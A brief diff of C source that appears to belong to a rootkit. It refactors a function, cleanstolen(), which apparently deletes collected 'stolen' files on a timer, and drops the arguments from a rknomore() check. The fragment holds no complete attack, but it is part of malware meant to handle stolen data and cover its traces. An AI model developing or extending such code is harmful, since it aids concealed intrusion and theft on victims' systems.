@@ -21,8 +21,7 @@ void rmstolens(void){
 }
 
 void cleanstolen(void){
-    if(rknomore(INSTALL_DIR, BDVLSO))
-        return;
+    if(rknomore()) return;
 
     int curtime = time(NULL);    
     if(itistime(CLEANEDTIME_PATH, curtime, FILE_CLEANSE_TIMER)){
